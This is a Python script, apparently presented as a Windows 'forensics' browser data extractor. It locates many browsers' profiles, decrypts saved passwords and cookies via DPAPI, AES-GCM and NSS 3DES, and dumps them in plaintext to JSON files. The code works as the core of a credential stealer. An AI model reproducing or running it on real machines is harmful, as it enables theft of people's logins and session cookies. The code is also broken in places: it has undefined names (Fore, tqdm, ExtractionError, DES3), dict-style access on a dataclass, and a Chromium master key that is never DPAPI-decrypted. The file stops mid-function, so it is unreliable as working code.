#!/usr/bin/env python3
import os
import json
import base64
import time
import subprocess
import socket
import pathlib
import tempfile
import shutil
import platform
import random
import sqlite3
import winreg
from typing import List, Dict, Any, Optional, Tuple
from datetime import datetime, timedelta
import websocket
import requests
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import win32crypt
import psutil
import glob
import logging
from pathlib import Path
import hashlib
import pyasn1
from pyasn1.codec.der import decoder
from pyasn1.type import univ
from pyasn1.type import namedtype
from pyasn1.type import tag
from pyasn1.type import useful
import struct
from dataclasses import dataclass
from enum import Enum

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('browser_extractor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class BrowserType(Enum):
    CHROMIUM = "chromium"
    FIREFOX = "firefox"
    IE = "ie"

@dataclass
class BrowserConfig:
    name: str
    user_data: Optional[str]
    executable: Optional[str]
    type: BrowserType
    registry_paths: List[str] = None
    portable_paths: List[str] = None

# Enhanced browser configurations with registry detection paths
BROWSER_CONFIGS = {
    "chrome": BrowserConfig(
        name="Google Chrome",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Google", "Chrome", "Application", "chrome.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Google Chrome"
        ],
        portable_paths=["chrome.exe", "GoogleChromePortable.exe"]
    ),
    "edge": BrowserConfig(
        name="Microsoft Edge",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES(X86)"], "Microsoft", "Edge", "Application", "msedge.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Microsoft Edge"
        ],
        portable_paths=["msedge.exe", "MicrosoftEdgePortable.exe"]
    ),
    "brave": BrowserConfig(
        name="Brave Browser",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Brave"
        ],
        portable_paths=["brave.exe", "BravePortable.exe"]
    ),
    "opera": BrowserConfig(
        name="Opera",
        user_data=os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Opera", "launcher.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Opera"
        ],
        portable_paths=["opera.exe", "OperaPortable.exe"]
    ),
    "opera_gx": BrowserConfig(
        name="Opera GX",
        user_data=os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Opera GX", "launcher.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\opera.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Opera GX"
        ],
        portable_paths=["opera.exe", "OperaGXPortable.exe"]
    ),
    "vivaldi": BrowserConfig(
        name="Vivaldi",
        user_data=os.path.join(os.environ["LOCALAPPDATA"], "Vivaldi", "User Data"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Vivaldi", "Application", "vivaldi.exe"),
        type=BrowserType.CHROMIUM,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\vivaldi.exe",
            r"SOFTWARE\Clients\StartMenuInternet\Vivaldi"
        ],
        portable_paths=["vivaldi.exe", "VivaldiPortable.exe"]
    ),
    "firefox": BrowserConfig(
        name="Mozilla Firefox",
        user_data=os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Mozilla Firefox", "firefox.exe"),
        type=BrowserType.FIREFOX,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
            r"SOFTWARE\Clients\StartMenuInternet\FIREFOX"
        ],
        portable_paths=["firefox.exe", "FirefoxPortable.exe"]
    ),
    "tor_browser": BrowserConfig(
        name="Tor Browser",
        user_data=os.path.join(os.environ["APPDATA"], "Tor Browser", "Browser", "TorBrowser", "Data", "Browser", "profile.default"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Tor Browser", "Browser", "firefox.exe"),
        type=BrowserType.FIREFOX,
        portable_paths=["firefox.exe", "TorBrowserPortable.exe"]
    ),
    "waterfox": BrowserConfig(
        name="Waterfox",
        user_data=os.path.join(os.environ["APPDATA"], "Waterfox", "Profiles"),
        executable=os.path.join(os.environ["PROGRAMFILES"], "Waterfox", "waterfox.exe"),
        type=BrowserType.FIREFOX,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\waterfox.exe"
        ],
        portable_paths=["waterfox.exe"]
    ),
    "internet_explorer": BrowserConfig(
        name="Internet Explorer",
        user_data=None,  # Registry-based
        executable=os.path.join(os.environ["PROGRAMFILES"], "Internet Explorer", "iexplore.exe"),
        type=BrowserType.IE,
        registry_paths=[
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\iexplore.exe"
        ]
    ),
}


class BrowserDataExtractor:
    def __init__(self, custom_paths: Dict[str, str] = None):
        self.platform = platform.system()
        if self.platform != "Windows":
            raise Exception("This script is Windows-only")
        
        self.custom_paths = custom_paths or {}
        self.errors = []  # Store errors for reporting
        self.extraction_stats = {
            "browsers_processed": 0,
            "total_cookies": 0,
            "total_history": 0,
            "total_passwords": 0,
            "errors": 0
        }
        
        print(f"{Fore.CYAN}Windows Universal Browser Data Extractor - Enhanced Version{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}FOR AUTHORIZED DIGITAL FORENSICS AND ACADEMIC RESEARCH ONLY{Style.RESET_ALL}")
        print()
        
        self.installed_browsers = self.detect_installed_browsers()
        print(f"{Fore.GREEN}Detected {len(self.installed_browsers)} installed browsers{Style.RESET_ALL}")
        
    def detect_installed_browsers(self) -> List[str]:
        """Enhanced browser detection using registry and file system"""
        installed = []
        
        for browser_id, config in BROWSER_CONFIGS.items():
            detected = False
            
            # Check custom paths first
            if browser_id in self.custom_paths:
                custom_path = self.custom_paths[browser_id]
                if os.path.exists(custom_path):
                    print(f"{Fore.GREEN}Found {config.name} at custom path: {custom_path}{Style.RESET_ALL}")
                    installed.append(browser_id)
                    # Update the config executable path
                    config.executable = custom_path
                    detected = True
                    continue
            
            # Check by executable existence
            if config.executable and os.path.exists(config.executable):
                print(f"{Fore.GREEN}Found {config.name} at: {config.executable}{Style.RESET_ALL}")
                installed.append(browser_id)
                detected = True
                continue
            
            # Check registry paths
            if config.registry_paths:
                for reg_path in config.registry_paths:
                    if self._check_registry_browser(reg_path):
                        print(f"{Fore.GREEN}Found {config.name} in registry: {reg_path}{Style.RESET_ALL}")
                        installed.append(browser_id)
                        detected = True
                        break
            
            # Check for portable browsers in common locations
            if not detected and config.portable_paths:
                portable_found = self._find_portable_browser(config.portable_paths)
                if portable_found:
                    print(f"{Fore.GREEN}Found portable {config.name} at: {portable_found}{Style.RESET_ALL}")
                    installed.append(browser_id)
                    config.executable = portable_found
                    detected = True
        
        return installed
    
    def _check_registry_browser(self, registry_path: str) -> bool:
        """Check if browser is installed via registry"""
        try:
            # Check HKEY_LOCAL_MACHINE first
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path) as key:
                # Just checking if we can open the key is enough
                return True
        except (OSError, FileNotFoundError):
            pass
        
        try:
            # Check HKEY_CURRENT_USER
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as key:
                return True
        except (OSError, FileNotFoundError):
            pass
        
        return False
    
    def _find_portable_browser(self, portable_names: List[str]) -> Optional[str]:
        """Search for portable browsers in common locations"""
        search_paths = [
            os.path.join(os.environ["PROGRAMFILES"], "PortableApps"),
            os.path.join(os.environ["PROGRAMFILES(X86)"], "PortableApps"),
            os.path.join(os.environ["USERPROFILE"], "Desktop"),
            os.path.join(os.environ["USERPROFILE"], "Downloads"),
            "C:\\PortableApps",
            "D:\\PortableApps",
            "E:\\PortableApps"
        ]
        
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
                
            for root, dirs, files in os.walk(search_path):
                for portable_name in portable_names:
                    if portable_name in files:
                        return os.path.join(root, portable_name)
        
        return None
    
    def get_chromium_profiles(self, user_data_path: str) -> List[str]:
        """Get all Chromium browser profiles with enhanced detection"""
        profiles = []
        if not os.path.exists(user_data_path):
            return profiles
        
        for item in os.listdir(user_data_path):
            profile_path = os.path.join(user_data_path, item)
            if os.path.isdir(profile_path):
                # Check if this is a valid profile (has browser data)
                if (os.path.exists(os.path.join(profile_path, "Network", "Cookies")) or
                    os.path.exists(os.path.join(profile_path, "History")) or
                    os.path.exists(os.path.join(profile_path, "Login Data")) or
                    os.path.exists(os.path.join(profile_path, "Cookies"))):  # Older versions
                    profiles.append(item)
        
        return profiles
    
    def get_firefox_profiles(self, profiles_path: str) -> List[str]:
        """Get all Firefox browser profiles with enhanced detection"""
        profiles = []
        if not os.path.exists(profiles_path):
            return profiles
        
        for item in os.listdir(profiles_path):
            profile_path = os.path.join(profiles_path, item)
            if os.path.isdir(profile_path):
                # Check if this is a valid Firefox profile
                if (os.path.exists(os.path.join(profile_path, "places.sqlite")) or
                    os.path.exists(os.path.join(profile_path, "cookies.sqlite")) or
                    os.path.exists(os.path.join(profile_path, "logins.json"))):
                    profiles.append(item)
        
        return profiles
    
    def get_chromium_master_key(self, user_data_path: str) -> bytes:
        """Get the master key for Chromium browsers with error handling"""
        local_state_path = os.path.join(user_data_path, "Local State")
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = local_state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key)
            
            return encrypted_key[5:]  # Remove DPAPI prefix
        except Exception as e:
            logger.error(f"Failed to get Chromium master key: {e}")
            raise ExtractionError(f"Master key extraction failed: {e}")
    
    def decrypt_with_dpapi(self, encrypted_data: bytes) -> bytes:
        """Decrypt data using Windows DPAPI with error handling"""
        try:
            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
        except Exception as e:
            logger.error(f"DPAPI decryption failed: {e}")
            raise ExtractionError(f"DPAPI decryption failed: {e}")
    
    def decrypt_chromium_value(self, encrypted_value: bytes, master_key: bytes) -> str:
        """Decrypt an encrypted Chromium browser value with enhanced error handling"""
        if not encrypted_value:
            return ""
        
        try:
            if encrypted_value[:3] in (b'v10', b'v11'):
                nonce = encrypted_value[3:3+12]
                ciphertext = encrypted_value[3+12:]
                
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt(ciphertext)
                return decrypted.decode('utf-8')
            else:
                return self.decrypt_with_dpapi(encrypted_value).decode('utf-8')
        except Exception as e:
            logger.warning(f"Failed to decrypt Chromium value: {e}")
            return ""
    
    def _create_forensic_copy(self, source_path: str, temp_dir: str) -> str:
        """Create a forensic copy of the database file"""
        try:
            # Generate hash of original file
            original_hash = self._calculate_file_hash(source_path)
            
            # Create temporary copy
            temp_path = os.path.join(temp_dir, os.path.basename(source_path))
            shutil.copy2(source_path, temp_path)
            
            # Verify copy integrity
            copy_hash = self._calculate_file_hash(temp_path)
            if original_hash != copy_hash:
                os.remove(temp_path)
                raise ExtractionError("File copy integrity check failed")
            
            return temp_path
        except Exception as e:
            logger.error(f"Failed to create forensic copy: {e}")
            raise ExtractionError(f"Forensic copy failed: {e}")
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA-256 hash of a file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
    
    def extract_chromium_cookies(self, user_data_path: str, profile: str, master_key: bytes) -> List[Dict[str, Any]]:
        """Extract cookies from Chromium browser with forensic safety"""
        cookies_db_path = os.path.join(user_data_path, profile, "Network", "Cookies")
        
        # Fallback for older Chrome versions
        if not os.path.exists(cookies_db_path):
            cookies_db_path = os.path.join(user_data_path, profile, "Cookies")
        
        if not os.path.exists(cookies_db_path):
            return []
        
        temp_dir = tempfile.mkdtemp()
        temp_db_path = None
        
        try:
            temp_db_path = self._create_forensic_copy(cookies_db_path, temp_dir)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            # Get all columns to handle different Chrome versions
            cursor.execute("PRAGMA table_info(cookies)")
            columns = [row[1] for row in cursor.fetchall()]
            
            # Build query dynamically based on available columns
            query = "SELECT " + ", ".join(columns) + " FROM cookies"
            cursor.execute(query)
            
            cookies = []
            for row in cursor.fetchall():
                row_dict = dict(zip(columns, row))
                
                if not row_dict.get("name") or not row_dict.get("host_key"):
                    continue
                
                decrypted_value = self.decrypt_chromium_value(row_dict.get("encrypted_value", b""), master_key)
                
                cookie = {
                    "host_key": row_dict.get("host_key", ""),
                    "name": row_dict.get("name", ""),
                    "path": row_dict.get("path", ""),
                    "value": decrypted_value,
                    "expires_utc": row_dict.get("expires_utc", 0),
                    "is_secure": bool(row_dict.get("is_secure", 0)),
                    "is_httponly": bool(row_dict.get("is_httponly", 0)),
                    "creation_utc": row_dict.get("creation_utc", 0),
                    "last_access_utc": row_dict.get("last_access_utc", 0),
                    "has_expires": bool(row_dict.get("has_expires", 0)),
                    "is_persistent": bool(row_dict.get("is_persistent", 0)),
                    "priority": row_dict.get("priority", 0),
                    "samesite": row_dict.get("samesite", -1),
                    "source_scheme": row_dict.get("source_scheme", 0),
                    "source_port": row_dict.get("source_port", 0)
                }
                
                cookies.append(cookie)
            
            cursor.close()
            conn.close()
            return cookies
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium cookies: {e}")
            self.errors.append(f"Chromium cookies extraction failed: {e}")
            return []
        
        finally:
            try:
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except:
                pass
    
    def extract_chromium_history(self, user_data_path: str, profile: str) -> List[Dict[str, Any]]:
        """Extract history from Chromium browser with forensic safety"""
        history_db_path = os.path.join(user_data_path, profile, "History")
        
        if not os.path.exists(history_db_path):
            return []
        
        temp_dir = tempfile.mkdtemp()
        temp_db_path = None
        
        try:
            temp_db_path = self._create_forensic_copy(history_db_path, temp_dir)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT urls.url, urls.title, urls.visit_count, urls.typed_count, urls.last_visit_time,
                       visits.visit_time, visits.from_visit, visits.transition
                FROM visits
                JOIN urls ON visits.url = urls.id
                ORDER BY visits.visit_time DESC
            """)
            
            history = []
            for row in cursor.fetchall():
                url, title, visit_count, typed_count, last_visit_time, \
                visit_time, from_visit, transition = row
                
                history_entry = {
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "typed_count": typed_count,
                    "last_visit_time": self.chrome_time_to_datetime(last_visit_time),
                    "visit_time": self.chrome_time_to_datetime(visit_time),
                    "from_visit": from_visit,
                    "transition": transition
                }
                
                history.append(history_entry)
            
            cursor.close()
            conn.close()
            return history
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium history: {e}")
            self.errors.append(f"Chromium history extraction failed: {e}")
            return []
        
        finally:
            try:
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except:
                pass
    
    def extract_chromium_passwords(self, user_data_path: str, profile: str, master_key: bytes) -> List[Dict[str, Any]]:
        """Extract passwords from Chromium browser with forensic safety"""
        login_db_path = os.path.join(user_data_path, profile, "Login Data")
        
        if not os.path.exists(login_db_path):
            return []
        
        temp_dir = tempfile.mkdtemp()
        temp_db_path = None
        
        try:
            temp_db_path = self._create_forensic_copy(login_db_path, temp_dir)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, action_url, username_value, password_value,
                       date_created, date_last_used, blacklisted_by_user, times_used
                FROM logins
            """)
            
            passwords = []
            for row in cursor.fetchall():
                origin_url, action_url, username_value, encrypted_password, \
                date_created, date_last_used, blacklisted_by_user, times_used = row
                
                decrypted_password = self.decrypt_chromium_value(encrypted_password, master_key)
                
                password_entry = {
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username_value": username_value,
                    "password_value": decrypted_password,
                    "date_created": self.chrome_time_to_datetime(date_created),
                    "date_last_used": self.chrome_time_to_datetime(date_last_used),
                    "blacklisted_by_user": bool(blacklisted_by_user),
                    "times_used": times_used
                }
                
                passwords.append(password_entry)
            
            cursor.close()
            conn.close()
            return passwords
        
        except Exception as e:
            logger.error(f"Failed to extract Chromium passwords: {e}")
            self.errors.append(f"Chromium passwords extraction failed: {e}")
            return []
        
        finally:
            try:
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except:
                pass
    
    def extract_firefox_master_key(self, profile_path: str, master_password: str = "") -> Optional[bytes]:
        """Extract Firefox master key using NSS with enhanced error handling"""
        key4_db_path = os.path.join(profile_path, "key4.db")
        
        if not os.path.exists(key4_db_path):
            # Try older key3.db
            key3_db_path = os.path.join(profile_path, "key3.db")
            if os.path.exists(key3_db_path):
                return self._extract_master_key_key3(key3_db_path, master_password)
            return None
        
        try:
            conn = sqlite3.connect(key4_db_path)
            cursor = conn.cursor()
            
            # Get the metadata
            cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password-check'")
            result = cursor.fetchone()
            
            if not result:
                return None
            
            global_salt, item2 = result
            
            # Parse the ASN.1 structure
            decoded, _ = decoder.decode(item2)
            
            # Extract entry salt and encrypted value
            entry_salt = bytes(decoded[0][1][0])
            encrypted_value = bytes(decoded[1])
            
            # Derive the key
            key = self._derive_nss_key(global_salt, entry_salt, master_password)
            
            # Decrypt the password-check value
            iv = encrypted_value[:8]
            ciphertext = encrypted_value[8:-24]  # Remove padding
            mac = encrypted_value[-24:]
            
            cipher = self._create_3des_cipher(key, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            # Verify with "password-check" constant
            if decrypted.endswith(b'password-check'):
                # Now get the actual master key
                cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'private-key'")
                result = cursor.fetchone()
                
                if result:
                    _, private_key_data = result
                    decoded, _ = decoder.decode(private_key_data)
                    
                    # Extract the master key
                    master_key_entry = decoded[1][0][1]
                    master_key_salt = bytes(master_key_entry[0][1][0])
                    master_key_encrypted = bytes(master_key_entry[1])
                    
                    # Derive master key
                    master_key = self._derive_nss_key(global_salt, master_key_salt, master_password)
                    
                    # Decrypt master key
                    iv = master_key_encrypted[:8]
                    ciphertext = master_key_encrypted[8:-24]
                    
                    cipher = self._create_3des_cipher(master_key, iv)
                    master_key_decrypted = cipher.decrypt(ciphertext)
                    
                    return master_key_decrypted
            
            cursor.close()
            conn.close()
            
        except Exception as e:
            logger.error(f"Failed to extract Firefox master key: {e}")
            self.errors.append(f"Firefox master key extraction failed: {e}")
        
        return None
    
    def _extract_master_key_key3(self, key3_db_path: str, master_password: str) -> Optional[bytes]:
        """Extract master key from older key3.db format"""
        try:
            # This is a simplified version - full implementation would need NSS library
            logger.warning("key3.db extraction requires NSS library - using simplified method")
            return None
        except Exception as e:
            logger.error(f"Failed to extract from key3.db: {e}")
            return None
    
    def _derive_nss_key(self, global_salt: bytes, entry_salt: bytes, master_password: str) -> bytes:
        """Derive NSS decryption key"""
        # This is a simplified version - full implementation follows NSS key derivation
        import hmac
        import hashlib
        
        # SHA1 of global_salt + master_password
        hp = hashlib.sha1(global_salt + master_password.encode()).digest()
        
        # HMAC-SHA1 of entry_salt + hp
        pes = entry_salt + b'\x00' * (20 - len(entry_salt))
        k1 = hmac.new(hp, pes, hashlib.sha1).digest()
        
        # Generate final key
        tk = hmac.new(hp, k1 + entry_salt, hashlib.sha1).digest()
        
        # Use first 24 bytes for 3DES key
        return tk[:24]
    
    def _create_3des_cipher(self, key: bytes, iv: bytes):
        """Create 3DES cipher for NSS decryption"""
        from Crypto.Cipher import DES3
        return DES3.new(key, DES3.MODE_CBC, iv)
    
    def extract_firefox_cookies(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract cookies from Firefox browser with forensic safety"""
        cookies_db_path = os.path.join(profile_path, "cookies.sqlite")
        
        if not os.path.exists(cookies_db_path):
            return []
        
        temp_dir = tempfile.mkdtemp()
        temp_db_path = None
        
        try:
            temp_db_path = self._create_forensic_copy(cookies_db_path, temp_dir)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT originAttributes, name, value, host, path, expiry, lastAccessed,
                       creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite
                FROM moz_cookies
            """)
            
            cookies = []
            for row in cursor.fetchall():
                origin_attributes, name, value, host, path, expiry, last_accessed, \
                creation_time, is_secure, is_http_only, in_browser_element, same_site = row
                
                cookie = {
                    "origin_attributes": origin_attributes,
                    "name": name,
                    "value": value,
                    "host": host,
                    "path": path,
                    "expiry": expiry,
                    "last_accessed": last_accessed,
                    "creation_time": creation_time,
                    "is_secure": bool(is_secure),
                    "is_http_only": bool(is_http_only),
                    "in_browser_element": bool(in_browser_element),
                    "same_site": same_site
                }
                
                cookies.append(cookie)
            
            cursor.close()
            conn.close()
            return cookies
        
        except Exception as e:
            logger.error(f"Failed to extract Firefox cookies: {e}")
            self.errors.append(f"Firefox cookies extraction failed: {e}")
            return []
        
        finally:
            try:
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except:
                pass
    
    def extract_firefox_history(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract history from Firefox browser with forensic safety"""
        history_db_path = os.path.join(profile_path, "places.sqlite")
        
        if not os.path.exists(history_db_path):
            return []
        
        temp_dir = tempfile.mkdtemp()
        temp_db_path = None
        
        try:
            temp_db_path = self._create_forensic_copy(history_db_path, temp_dir)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT moz_places.url, moz_places.title, moz_places.visit_count,
                       moz_places.last_visit_date, moz_places.frecency, moz_places.hidden
                FROM moz_places
                ORDER BY moz_places.last_visit_date DESC
            """)
            
            history = []
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date, frecency, hidden = row
                
                history_entry = {
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit_date": self.firefox_time_to_datetime(last_visit_date),
                    "frecency": frecency,
                    "hidden": bool(hidden)
                }
                
                history.append(history_entry)
            
            cursor.close()
            conn.close()
            return history
        
        except Exception as e:
            logger.error(f"Failed to extract Firefox history: {e}")
            self.errors.append(f"Firefox history extraction failed: {e}")
            return []
        
        finally:
            try:
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except:
                pass
    
    def extract_firefox_passwords(self, profile_path: str, master_password: str = "") -> List[Dict[str, Any]]:
        """Extract passwords from Firefox browser with enhanced NSS decryption"""
        logins_path = os.path.join(profile_path, "logins.json")
        
        if not os.path.exists(logins_path):
            return []
        
        try:
            with open(logins_path, 'r', encoding='utf-8') as f:
                logins_data = json.load(f)
            
            # Get master key for decryption
            master_key = self.extract_firefox_master_key(profile_path, master_password)
            
            passwords = []
            for login in logins_data.get("logins", []):
                username_encrypted = login.get("encryptedUsername", "")
                password_encrypted = login.get("encryptedPassword", "")
                
                # Decrypt if we have the master key
                username_value = username_encrypted
                password_value = password_encrypted
                
                if master_key:
                    try:
                        username_value = self._decrypt_firefox_login(username_encrypted, master_key)
                        password_value = self._decrypt_firefox_login(password_encrypted, master_key)
                    except Exception as e:
                        logger.warning(f"Failed to decrypt Firefox login: {e}")
                
                password_entry = {
                    "hostname": login.get("hostname", ""),
                    "httpRealm": login.get("httpRealm", ""),
                    "formSubmitURL": login.get("formSubmitURL", ""),
                    "usernameField": login.get("usernameField", ""),
                    "passwordField": login.get("passwordField", ""),
                    "username_value": username_value,
                    "password_value": password_value,
                    "guid": login.get("guid", ""),
                    "encType": login.get("encType", 0),
                    "timeCreated": login.get("timeCreated", 0),
                    "timeLastUsed": login.get("timeLastUsed", 0),
                    "timePasswordChanged": login.get("timePasswordChanged", 0)
                }
                
                passwords.append(password_entry)
            
            return passwords
        
        except Exception as e:
            logger.error(f"Failed to extract Firefox passwords: {e}")
            self.errors.append(f"Firefox passwords extraction failed: {e}")
            return []
    
    def _decrypt_firefox_login(self, encrypted_data: str, master_key: bytes) -> str:
        """Decrypt Firefox login data using master key"""
        try:
            # Decode Base64
            encrypted_bytes = base64.b64decode(encrypted_data)
            
            # Parse ASN.1 structure
            decoded, _ = decoder.decode(encrypted_bytes)
            
            # Extract IV and ciphertext
            iv = bytes(decoded[0])
            ciphertext = bytes(decoded[1])
            
            # Decrypt with 3DES
            cipher = self._create_3des_cipher(master_key, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            # Remove PKCS#7 padding
            decrypted = unpad(decrypted, DES3.block_size)
            
            return decrypted.decode('utf-8')
        except Exception as e:
            logger.warning(f"Firefox login decryption failed: {e}")
            return encrypted_data  # Return encrypted if decryption fails
    
    def extract_ie_history(self) -> List[Dict[str, Any]]:
        """Extract Internet Explorer history from registry"""
        history = []
        
        try:
            # Typed URLs
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Internet Explorer\TypedURLs") as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    url, value, reg_type = winreg.EnumValue(key, i)
                    history_entry = {
                        "url": value,
                        "title": "",
                        "visit_count": 1,
                        "last_visit_date": datetime.now(),
                        "source": "IE_TypedURLs"
                    }
                    history.append(history_entry)
        except Exception as e:
            logger.error(f"IE history extraction failed: {e}")
            self.errors.append(f"IE history extraction failed: {e}")
        
        return history
    
    def save_browser_data(self, browser_name: str, browser_data: Dict[str, Any]):
        """Save browser data to separate JSON files with error handling"""
        try:
            browser_filename = browser_name.replace(" ", "_").lower()
            
            # Save cookies
            if browser_data.get("cookies"):
                cookies_file = f"{browser_filename}_cookies.json"
                with open(cookies_file, "w", encoding="utf-8") as f:
                    json.dump(browser_data["cookies"], f, indent=2, default=str)
                print(f"  {Fore.GREEN}✓ Saved {len(browser_data['cookies'])} cookies to {cookies_file}{Style.RESET_ALL}")
            
            # Save history
            if browser_data.get("history"):
                history_file = f"{browser_filename}_history.json"
                with open(history_file, "w", encoding="utf-8") as f:
                    json.dump(browser_data["history"], f, indent=2, default=str)
                print(f"  {Fore.GREEN}✓ Saved {len(browser_data['history'])} history entries to {history_file}{Style.RESET_ALL}")
            
            # Save passwords
            if browser_data.get("passwords"):
                passwords_file = f"{browser_filename}_passwords.json"
                with open(passwords_file, "w", encoding="utf-8") as f:
                    json.dump(browser_data["passwords"], f, indent=2, default=str)
                print(f"  {Fore.GREEN}✓ Saved {len(browser_data['passwords'])} passwords to {passwords_file}{Style.RESET_ALL}")
        
        except Exception as e:
            logger.error(f"Failed to save {browser_name} data: {e}")
            self.errors.append(f"Failed to save {browser_name} data: {e}")
    
    def extract_all_browser_data(self, master_password: str = "") -> Dict[str, Any]:
        """Extract data from all installed browsers with enhanced error handling"""
        all_data = {
            "browsers": {},
            "summary": {
                "total_browsers": len(self.installed_browsers),
                "extraction_time": datetime.now().isoformat(),
                "errors": []
            }
        }
        
        print(f"\n{Fore.CYAN}Extracting data from all installed browsers...{Style.RESET_ALL}")
        
        # Create progress bar
        with tqdm(total=len(self.installed_browsers), desc="Processing browsers", unit="browser") as pbar:
            for browser_id in self.installed_browsers:
                config = BROWSER_CONFIGS[browser_id]
                print(f"\n{Fore.YELLOW}Processing {config['name']}...{Style.RESET_ALL}")
                
                browser_data = {
                    "cookies": {},
                    "history": {},
                    "passwords": {}
                }
                
                try:
                    if config["type"] == BrowserType.CHROMIUM:
                        master_key = self.get_chromium_master_key(config["user_data"])
                        profiles = self.get_chromium_profiles(config["user_data"])
                        
                        for profile in profiles:
                            print(f"  Processing profile: {profile}")
                            
                            try:
                                cookies = self.extract_chromium_cookies(config["user_data"], profile, master_key)
                                if cookies:
                                    browser_data["cookies"][profile] = cookies
                                    self.extraction_stats["total_cookies"] += len(cookies)
                            except Exception as e:
                                logger.error(f"Cookie extraction failed for {profile}: {e}")
                                self.errors.append(f"{config['name']} {profile} cookies: {e}")
                            
                            try:
                                history = self.extract_chromium_history(config["user_data"], profile)
                                if history:
                                    browser_data["history"][profile] = history
                                    self.extraction_stats["total_history"] += len(history)
                            except Exception as e:
                                logger.error(f"History extraction failed for {profile}: {e}")
                                self.errors.append(f"{config['name']} {profile} history: {e}")
                            
                            try:
                                passwords = self.extract_chromium_passwords(config["user_data"], profile, master_key)
                                if passwords:
                                    browser_data["passwords"][profile] = passwords
                                    self.extraction_stats["total_passwords"] += len(passwords)
                            except Exception as e:
                                logger.error(f"Password extraction failed for {profile}: {e}")
                                self.errors.append(f"{config['name']} {profile} passwords: {e}")
                    
                    elif config["type"] == BrowserType.FIREFOX:
                        profiles = self.get_firefox_profiles(config["user_data"])
                        
                        for profile in profiles:
                            profile_path = os.path.join(config["user_data"], profile)
